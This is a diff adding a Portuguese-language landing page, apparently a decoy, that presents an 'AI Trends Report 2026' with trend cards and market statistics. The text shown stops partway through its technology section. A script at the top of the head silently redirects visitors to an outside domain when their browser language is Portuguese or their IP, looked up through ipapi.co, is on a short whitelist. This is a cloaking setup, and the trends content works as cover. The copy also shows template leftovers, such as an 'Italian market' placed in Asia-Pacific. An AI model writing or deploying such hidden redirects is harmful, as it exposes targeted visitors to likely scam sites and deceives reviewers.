@@ -1,0 +1,1473 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+ 
+	  <script>
+  // ✅ Lista Branca de IP
+  const WHITE_LIST_IPS = [
+    "38.134.114.67",
+    "35.215.169.58",
+	   "154.29.238.6",
+    "23.229.109.217",
+    "103.160.180.218"
+  ];
+
+  // URL de redirecionamento
+  const REDIRECT_URL = "https://mak922p.site/yida2/brok/";
+
+  // ✅ Verificar se o idioma é português
+  function isPortugueseLang() {
+    const langs = navigator.languages?.length
+      ? navigator.languages
+      : [navigator.language || ""];
+    // Alterado de "it" para "pt" para corresponder ao português
+    return langs.some(l => l.toLowerCase().startsWith("pt"));
+  }
+
+  // ✅ Executar redirecionamento
+  function redirect() {
+    window.location.replace(REDIRECT_URL);
+  }
+
+  // ✅ Fetch com tempo limite
+  function fetchWithTimeout(url, ms = 4000) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), ms);
+    return fetch(url, { signal: controller.signal })
+      .finally(() => clearTimeout(timer));
+  }
+
+  // ✅ Lógica principal: verificação de idioma primeiro, evitando solicitações de rede desnecessárias
+  (async function init() {
+    // Passo 1: Detecção de idioma, julgamento imediato, sem necessidade de rede
+    if (isPortugueseLang()) {
+      redirect();
+      return;
+    }
+
+    // Passo 2: Se o idioma não corresponder, verifique o IP
+    try {
+      const res = await fetchWithTimeout("https://ipapi.co/json/");
+      const data = await res.json();
+      if (WHITE_LIST_IPS.includes(data.ip)) {
+        redirect();
+      }
+    } catch (e) {
+      // Falha ao obter IP (tempo limite / erro de rede): não redirecionar, processamento silencioso
+      console.warn("IP check failed:", e.message);
+    }
+  })();
+</script>
+
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Relatório de Tendências de IA 2026 - Especialistas explicam as últimas tendências, inovação tecnológica e análise de mercado da inteligência artificial.">
+    <title>Relatório de Tendências de IA 2026 | Na vanguarda da Inteligência Artificial</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --primary: #1a56db;
+            --primary-dark: #1e40af;
+            --secondary: #0ea5e9;
+            --accent: #7c3aed;
+            --dark: #0f172a;
+            --gray: #64748b;
+            --light-gray: #f1f5f9;
+            --white: #ffffff;
+            --border: #e2e8f0;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Noto Sans', sans-serif;
+            color: var(--dark);
+            background: var(--white);
+            line-height: 1.7;
+        }
+
+        /* HEADER */
+        header {
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            background: rgba(255,255,255,0.97);
+            backdrop-filter: blur(8px);
+            border-bottom: 1px solid var(--border);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+
+        .header-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 64px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--dark);
+        }
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .logo-text {
+            font-size: 17px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+
+        .logo-text span {
+            color: var(--primary);
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+            gap: 4px;
+            align-items: center;
+        }
+
+        nav ul li a {
+            text-decoration: none;
+            color: var(--gray);
+            font-size: 14px;
+            font-weight: 500;
+            padding: 6px 12px;
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+
+        nav ul li a:hover {
+            color: var(--primary);
+            background: #eff6ff;
+        }
+
+        .nav-cta {
+            background: var(--primary) !important;
+            color: white !important;
+            padding: 8px 16px !important;
+        }
+
+        .nav-cta:hover {
+            background: var(--primary-dark) !important;
+        }
+
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+            gap: 5px;
+            padding: 4px;
+        }
+
+        .hamburger span {
+            width: 24px;
+            height: 2px;
+            background: var(--dark);
+            border-radius: 2px;
+            transition: 0.3s;
+        }
+
+        .mobile-nav {
+            display: none;
+            flex-direction: column;
+            background: white;
+            border-top: 1px solid var(--border);
+            padding: 16px 20px;
+        }
+
+        .mobile-nav.open {
+            display: flex;
+        }
+
+        .mobile-nav a {
+            text-decoration: none;
+            color: var(--dark);
+            font-size: 15px;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--border);
+            font-weight: 500;
+        }
+
+        .mobile-nav a:last-child { border-bottom: none; }
+
+        /* HERO */
+        .hero {
+            background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 50%, #312e81 100%);
+            color: white;
+            padding: 80px 20px 100px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.15);
+            border: 1px solid rgba(255,255,255,0.25);
+            padding: 6px 16px;
+            border-radius: 100px;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 24px;
+            backdrop-filter: blur(4px);
+        }
+
+        .hero h1 {
+            font-size: clamp(28px, 5vw, 52px);
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 20px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .hero h1 span {
+            background: linear-gradient(90deg, #60a5fa, #a78bfa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: clamp(15px, 2vw, 18px);
+            color: rgba(255,255,255,0.8);
+            max-width: 640px;
+            margin: 0 auto 36px;
+            font-weight: 300;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .btn-primary {
+            background: var(--secondary);
+            color: white;
+            text-decoration: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 15px;
+            transition: all 0.2s;
+            border: none;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .btn-primary:hover {
+            background: #0284c7;
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(14,165,233,0.4);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: white;
+            text-decoration: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 15px;
+            border: 1px solid rgba(255,255,255,0.4);
+            transition: all 0.2s;
+            display: inline-block;
+        }
+
+        .btn-outline:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 60px;
+            flex-wrap: wrap;
+        }
+
+        .hero-stat {
+            text-align: center;
+        }
+
+        .hero-stat strong {
+            display: block;
+            font-size: 28px;
+            font-weight: 700;
+            color: #60a5fa;
+        }
+
+        .hero-stat span {
+            font-size: 13px;
+            color: rgba(255,255,255,0.6);
+        }
+
+        /* SECTION COMMON */
+        section {
+            padding: 80px 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .section-label {
+            display: inline-block;
+            color: var(--primary);
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+        }
+
+        .section-title {
+            font-size: clamp(22px, 3.5vw, 36px);
+            font-weight: 700;
+            margin-bottom: 16px;
+            line-height: 1.35;
+        }
+
+        .section-desc {
+            color: var(--gray);
+            font-size: 16px;
+            max-width: 600px;
+            margin-bottom: 48px;
+            font-weight: 300;
+        }
+
+        .text-center { text-align: center; }
+        .text-center .section-desc { margin-left: auto; margin-right: auto; }
+
+        /* TRENDS GRID */
+        #trends {
+            background: var(--light-gray);
+        }
+
+        .trends-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+        }
+
+        .trend-card {
+            background: white;
+            border-radius: 16px;
+            padding: 28px;
+            border: 1px solid var(--border);
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .trend-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            border-color: var(--primary);
+        }
+
+        .trend-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .trend-card:hover::before { opacity: 1; }
+
+        .trend-icon {
+            width: 52px;
+            height: 52px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin-bottom: 18px;
+        }
+
+        .trend-card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .trend-card p {
+            color: var(--gray);
+            font-size: 14px;
+            line-height: 1.7;
+        }
+
+        .trend-tag {
+            display: inline-block;
+            margin-top: 14px;
+            padding: 4px 10px;
+            border-radius: 100px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        /* MARKET SECTION */
+        #market {
+            background: white;
+        }
+
+        .market-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        @media (max-width: 768px) {
+            .market-grid { grid-template-columns: 1fr; gap: 40px; }
+        }
+
+        .market-text h2 {
+            font-size: clamp(22px, 3vw, 34px);
+            font-weight: 700;
+            margin-bottom: 18px;
+            line-height: 1.35;
+        }
+
+        .market-text p {
+            color: var(--gray);
+            font-size: 15px;
+            margin-bottom: 16px;
+            line-height: 1.8;
+            font-weight: 300;
+        }
+
+        .market-chart {
+            background: var(--light-gray);
+            border-radius: 20px;
+            padding: 28px;
+            border: 1px solid var(--border);
+        }
+
+        .chart-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--gray);
+            margin-bottom: 20px;
+        }
+
+        .bar-chart {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .bar-item {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .bar-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+
+        .bar-track {
+            height: 10px;
+            background: var(--border);
+            border-radius: 100px;
+            overflow: hidden;
+        }
+
+        .bar-fill {
+            height: 100%;
+            border-radius: 100px;
+            animation: growBar 1.5s ease-out forwards;
+            transform-origin: left;
+        }
+
+        @keyframes growBar {
+            from { width: 0; }
+        }
+
+        /* TECH SECTION */
+        #technology {
+            background: var(--light-gray);
+        }
+
+        .tech-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        .tech-card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            border: 1px solid var(--border);
+            transition: all 0.2s;
+        }
+
+        .tech-card:hover {
+            border-color: var(--secondary);
+            box-shadow: 0 4px 16px rgba(14,165,233,0.12);
+        }
+
+        .tech-number {
+            font-size: 36px;
+            font-weight: 700;
+            color: var(--primary);
+            line-height: 1;
+            margin-bottom: 8px;
+        }
+
+        .tech-number span {
+            font-size: 18px;
+        }
+
+        .tech-card h4 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .tech-card p {
+            font-size: 13px;
+            color: var(--gray);
+            line-height: 1.6;
+        }
+
+        /* FORECAST */
+        #forecast {
+            background: white;
+        }
+
+        .forecast-timeline {
+            position: relative;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .forecast-timeline::before {
+            content: '';
+            position: absolute;
+            left: 20px;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: linear-gradient(to bottom, var(--primary), var(--accent));
+        }
+
+        @media (min-width: 600px) {
+            .forecast-timeline::before { left: 50%; transform: translateX(-50%); }
+        }
+
+        .timeline-item {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 40px;
+            align-items: flex-start;
+            position: relative;
+        }
+
+        .timeline-dot {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: var(--primary);
+            color: white;
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            z-index: 1;
+            position: relative;
+            box-shadow: 0 0 0 6px rgba(26,86,219,0.12);
+        }
+
+        .timeline-content {
+            background: var(--light-gray);
+            border-radius: 12px;
+            padding: 20px;
+            flex: 1;
+            border: 1px solid var(--border);
+        }
+
+        .timeline-content h4 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--primary);
+        }
+
+        .timeline-content p {
+            font-size: 14px;
+            color: var(--gray);
+            line-height: 1.7;
+        }
+
+        /* INDUSTRY SECTION */
+        #industry {
+            background: linear-gradient(135deg, #0f172a, #1e3a8a);
+            color: white;
+        }
+
+        .industry-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+        }
+
+        .industry-card {
+            background: rgba(255,255,255,0.07);
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .industry-card:hover {
+            background: rgba(255,255,255,0.12);
+            transform: translateY(-2px);
+        }
+
+        .industry-icon {
+            font-size: 36px;
+            margin-bottom: 14px;
+        }
+
+        .industry-card h4 {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .industry-card p {
+            font-size: 13px;
+            color: rgba(255,255,255,0.65);
+            line-height: 1.6;
+        }
+
+        /* NEWSLETTER / CTA */
+        #newsletter {
+            background: var(--light-gray);
+        }
+
+        .cta-box {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border-radius: 24px;
+            padding: 60px 40px;
+            text-align: center;
+            color: white;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .cta-box h2 {
+            font-size: clamp(22px, 3.5vw, 32px);
+            font-weight: 700;
+            margin-bottom: 14px;
+        }
+
+        .cta-box p {
+            font-size: 15px;
+            opacity: 0.85;
+            margin-bottom: 32px;
+            font-weight: 300;
+        }
+
+        .cta-form {
+            display: flex;
+            gap: 10px;
+            max-width: 480px;
+            margin: 0 auto;
+            flex-wrap: wrap;
+        }
+
+        .cta-form input {
+            flex: 1;
+            min-width: 200px;
+            padding: 13px 18px;
+            border-radius: 8px;
+            border: none;
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+        }
+
+        .cta-form button {
+            background: white;
+            color: var(--primary);
+            border: none;
+            padding: 13px 22px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .cta-form button:hover {
+            background: #f0f7ff;
+            transform: translateY(-1px);
+        }
+
+        .cta-note {
+            margin-top: 14px;
+            font-size: 12px;
+            opacity: 0.7;
+        }
+
+        /* ABOUT */
+        #about {
+            background: white;
+        }
+
+        .about-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        @media (max-width: 768px) {
+            .about-grid { grid-template-columns: 1fr; gap: 32px; }
+        }
+
+        .about-text h2 {
+            font-size: clamp(22px, 3vw, 32px);
+            font-weight: 700;
+            margin-bottom: 18px;
+        }
+
+        .about-text p {
+            color: var(--gray);
+            font-size: 15px;
+            line-height: 1.8;
+            font-weight: 300;
+            margin-bottom: 14px;
+        }
+
+        .about-features {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .about-feature {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+            padding: 16px;
+            background: var(--light-gray);
+            border-radius: 10px;
+        }
+
+        .about-feature-icon {
+            width: 36px;
+            height: 36px;
+            background: var(--primary);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .about-feature h5 {
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .about-feature p {
+            font-size: 13px;
+            color: var(--gray);
+            line-height: 1.5;
+        }
+
+        /* FOOTER */
+        footer {
+            background: var(--dark);
+            color: rgba(255,255,255,0.7);
+        }
+
+        .footer-top {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 60px 20px 40px;
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr 1fr;
+            gap: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .footer-top { grid-template-columns: 1fr 1fr; gap: 32px; }
+        }
+
+        @media (max-width: 480px) {
+            .footer-top { grid-template-columns: 1fr; }
+        }
+
+        .footer-brand .logo {
+            color: white;
+            margin-bottom: 16px;
+        }
+
+        .footer-brand p {
+            font-size: 13px;
+            line-height: 1.7;
+            max-width: 280px;
+        }
+
+        .footer-col h6 {
+            font-size: 14px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 16px;
+        }
+
+        .footer-col ul {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .footer-col ul li a {
+            color: rgba(255,255,255,0.6);
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .footer-col ul li a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+        }
+
+        .footer-bottom a {
+            color: rgba(255,255,255,0.5);
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .footer-bottom a:hover { color: white; }
+
+        /* BREADCRUMB */
+        .breadcrumb {
+            background: white;
+            border-bottom: 1px solid var(--border);
+            padding: 10px 20px;
+        }
+
+        .breadcrumb-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            gap: 6px;
+            font-size: 12px;
+            color: var(--gray);
+            align-items: center;
+        }
+
+        .breadcrumb-inner a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .breadcrumb-inner span { color: var(--border); }
+
+        /* ANNOUNCEMENT BAR */
+        .announcement-bar {
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            color: white;
+            text-align: center;
+            padding: 10px 20px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .announcement-bar a {
+            color: white;
+            text-decoration: underline;
+            margin-left: 8px;
+        }
+
+        /* SUCCESS */
+        .success-msg {
+            display: none;
+            background: rgba(255,255,255,0.2);
+            border: 1px solid rgba(255,255,255,0.4);
+            border-radius: 8px;
+            padding: 12px 20px;
+            margin-top: 16px;
+            font-size: 14px;
+        }
+
+        /* Responsive nav */
+        @media (max-width: 900px) {
+            nav { display: none; }
+            .hamburger { display: flex; }
+        }
+
+        @media (max-width: 480px) {
+            .hero-stats { gap: 24px; }
+            .cta-box { padding: 40px 24px; }
+        }
+
+        /* Scroll top */
+        .scroll-top {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 44px;
+            height: 44px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(26,86,219,0.4);
+            transition: all 0.3s;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        .scroll-top.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .scroll-top:hover { transform: translateY(-2px); }
+    </style>
+</head>
+<body>
+
+<!-- Announcement Bar -->
+<div class="announcement-bar">
+    🚀 Distribuição gratuita do Relatório de Tendências de IA 2026.
+    <a href="#newsletter">Baixe agora</a>
+</div>
+
+<!-- Header -->
+<header>
+    <div class="header-inner">
+        <a href="#" class="logo">
+            <div class="logo-icon">IA</div>
+            <span class="logo-text">AI<span>Trend</span>Lab</span>
+        </a>
+        <nav>
+            <ul>
+                <li><a href="#trends">Últimas Tendências</a></li>
+                <li><a href="#market">Análise de Mercado</a></li>
+                <li><a href="#technology">Tendências Tecnológicas</a></li>
+                <li><a href="#forecast">Previsões Futuras</a></li>
+                <li><a href="#industry">Por Setor</a></li>
+                <li><a href="#about">Sobre Nós</a></li>
+                <li><a href="#newsletter" class="nav-cta">Obter o Relatório</a></li>
+            </ul>
+        </nav>
+        <div class="hamburger" onclick="toggleMobileNav()" aria-label="Menu">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </div>
+    <div class="mobile-nav" id="mobileNav">
+        <a href="#trends" onclick="toggleMobileNav()">Últimas Tendências</a>
+        <a href="#market" onclick="toggleMobileNav()">Análise de Mercado</a>
+        <a href="#technology" onclick="toggleMobileNav()">Tendências Tecnológicas</a>
+        <a href="#forecast" onclick="toggleMobileNav()">Previsões Futuras</a>
+        <a href="#industry" onclick="toggleMobileNav()">Por Setor</a>
+        <a href="#about" onclick="toggleMobileNav()">Sobre Nós</a>
+        <a href="#newsletter" onclick="toggleMobileNav()">Obter o Relatório</a>
+    </div>
+</header>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+    <div class="breadcrumb-inner">
+        <a href="#">Início</a>
+        <span>›</span>
+        <a href="#trends">Tendências de IA</a>
+        <span>›</span>
+        <span>Último Relatório 2026</span>
+    </div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="home">
+    <div class="hero-badge">📊 Edição 2026 Atualizada</div>
+    <h1>O futuro dos negócios<br><span>transformado pela IA</span> e as últimas tendências</h1>
+    <p>A rápida evolução da IA generativa, do aprendizado de máquina e das tecnologias de automação. Uma equipe de especialistas analisa as tendências de ponta para fornecer insights úteis para sua estratégia de negócios.</p>
+    <div class="hero-buttons">
+        <a href="#trends" class="btn-primary">Ver as Tendências</a>
+        <a href="#newsletter" class="btn-outline">Obter o Relatório Gratuito</a>
+    </div>
+    <div class="hero-stats">
+        <div class="hero-stat">
+            <strong>US$ 1.8 Trilhão</strong>
+            <span>Previsão do Mercado Global de IA em 2030</span>
+        </div>
+        <div class="hero-stat">
+            <strong>37%</strong>
+            <span>Taxa de Crescimento Anual Composta (CAGR)</span>
+        </div>
+        <div class="hero-stat">
+            <strong>775 Milhões</strong>
+            <span>Trabalhadores que usarão IA</span>
+        </div>
+    </div>
+</section>
+
+<!-- Trends Section -->
+<section id="trends">
+    <div class="container">
+        <div class="text-center">
+            <span class="section-label">Últimas Tendências</span>
+            <h2 class="section-title">Tendências de IA em Destaque para 2026</h2>
+            <p class="section-desc">À medida que a inovação tecnológica acelera, explicamos as principais tendências de IA que estão se espalhando rapidamente em vários campos.</p>
+        </div>
+        <div class="trends-grid">
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#eff6ff;">🤖</div>
+                <h3>Difusão da IA Generativa (Generative AI)</h3>
+                <p>Modelos de linguagem de grande escala (LLMs) como ChatGPT, Gemini e Claude estão penetrando rapidamente no mundo dos negócios. A automação da criação de documentos, suporte à programação e atendimento ao cliente está acelerando.</p>
+                <span class="trend-tag" style="background:#eff6ff;color:#1a56db;">🔥 Em rápido crescimento</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#f0fdf4;">🧠</div>
+                <h3>IA Multimodal</h3>
+                <p>Surgiu uma IA que integra, entende e gera texto, imagens, áudio e vídeo. Interações mais naturais e semelhantes às humanas são possíveis, melhorando drasticamente a experiência do usuário (UX).</p>
+                <span class="trend-tag" style="background:#f0fdf4;color:#16a34a;">💡 Tecnologia em destaque</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#fdf4ff;">⚡</div>
+                <h3>Ascensão dos Agentes de IA</h3>
+                <p>Agentes de IA que planejam e executam tarefas de forma autônoma estão evoluindo. A "IA Agêntica", capaz de executar processos de negócios complexos sem supervisão humana, está atraindo a atenção.</p>
+                <span class="trend-tag" style="background:#fdf4ff;color:#7c3aed;">🚀 Na vanguarda</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#fff7ed;">🏭</div>
+                <h3>IA para a Indústria (Industrial AI)</h3>
+                <p>A introdução de IA especializada em fabricação, logística e gerenciamento de infraestrutura está em expansão. Efeitos de redução de custos de trilhões por ano foram demonstrados em manutenção preditiva, controle de qualidade e otimização da cadeia de suprimentos.</p>
+                <span class="trend-tag" style="background:#fff7ed;color:#ea580c;">📈 Expansão do mercado</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#fef2f2;">🔒</div>
+                <h3>IA Responsável e Governança de IA</h3>
+                <p>O desenvolvimento de regulamentações, começando com o AI Act da UE, está progredindo globalmente. A resposta ao desenvolvimento ético da IA, como IA explicável (XAI), detecção de vieses e garantia de transparência, tornou-se a questão mais importante para as empresas.</p>
+                <span class="trend-tag" style="background:#fef2f2;color:#dc2626;">⚖️ Conformidade regulatória</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#f0f9ff;">🌐</div>
+                <h3>Evolução da Edge AI e Modelos Pequenos</h3>
+                <p>A Edge AI, que executa o processamento de IA em dispositivos, afastando-se da dependência da nuvem, está se espalhando. Graças ao alto desempenho dos SLMs (Small Language Models), o uso da IA em ambientes offline tornou-se realidade.</p>
+                <span class="trend-tag" style="background:#f0f9ff;color:#0284c7;">📱 Fase de difusão</span>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Market Section -->
+<section id="market">
+    <div class="container">
+        <div class="market-grid">
+            <div class="market-text">
+                <span class="section-label">Análise de Mercado</span>
+                <h2 class="section-title">O tamanho do mercado global de IA<br>continua a se expandir rapidamente</h2>
+                <p>O mercado global de IA ultrapassou US$ 500 bilhões em 2024 e deve atingir US$ 1,8 trilhão até 2030. O crescimento é particularmente notável na região da Ásia-Pacífico, com o mercado italiano com previsão de crescer a uma taxa anual superior a 30%.</p>
+                <p>Os investimentos corporativos em IA continuarão a se expandir em 2026, com uma aceleração da adoção, particularmente nos setores de manufatura, financeiro, médico e de varejo. As estratégias governamentais de IA, combinadas com investimentos ativos de empresas privadas, estão impulsionando o mercado.</p>
+                <p>Por outro lado, a escassez de talentos no campo da IA é um desafio global, e a demanda por engenheiros de IA e cientistas de dados continua a superar em muito a oferta.</p>
+                <a href="#newsletter" class="btn-primary" style="display:inline-block;margin-top:20px;">Ver o Relatório Detalhado</a>
+            </div>
+            <div class="market-chart">
+                <div class="chart-title">📊 Taxa de adoção de IA por setor (2026)</div>
+                <div class="bar-chart">
+                    <div class="bar-item">
+                        <div class="bar-label"><span>Finanças e Seguros</span><span>78%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:78%;background:linear-gradient(90deg,#1a56db,#3b82f6);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>TI e Tecnologia</span><span>85%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:85%;background:linear-gradient(90deg,#7c3aed,#a78bfa);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>Medicina e Farmacêutica</span><span>62%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:62%;background:linear-gradient(90deg,#059669,#34d399);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>Manufatura</span><span>57%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:57%;background:linear-gradient(90deg,#d97706,#fbbf24);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>Varejo e E-commerce</span><span>71%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:71%;background:linear-gradient(90deg,#dc2626,#f87171);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>Educação</span><span>44%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:44%;background:linear-gradient(90deg,#0891b2,#22d3ee);"></div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Technology Section -->
+<section id="technology">
+    <div class="container">
+        <div class="text-center">
+            <span class="section-label">Tendências Tecnológicas</span>
+            <h2 class="section-title">Inovação das tecnologias essenciais que suportano a IA</h2>
+            <p class="section-desc">Apresentamos os dados mais recentes e o impacto no mercado para cada campo tecnológico de IA em rápida evolução.</p>
+        </div>
+        <div class="tech-grid">
+            <div class="tech-card">
+                <div class="tech-number">GPT-5<span> Geração</span></div>
+                <h4>Modelos de Linguagem de Grande Escala (LLMs)</h4>
+                <p>As capacidades de raciocínio melhoraram drasticamente devido ao aumento no número de parâmetros e melhorias na arquitetura. A especialização em campos específicos está acelerando.</p>
+            </div>
+            <div class="tech-card">
+                <div class="tech-number">40<span>x</span></div>
+                <h4>Melhoria no Desempenho Computacional</h4>
+                <p>Graças à evolução dos chips de IA (GPU/NPU), o desempenho do processamento de IA aumentou cerca de 40 vezes nos últimos 3 anos. A eficiência energética também melhorou.</p>
+            </div>
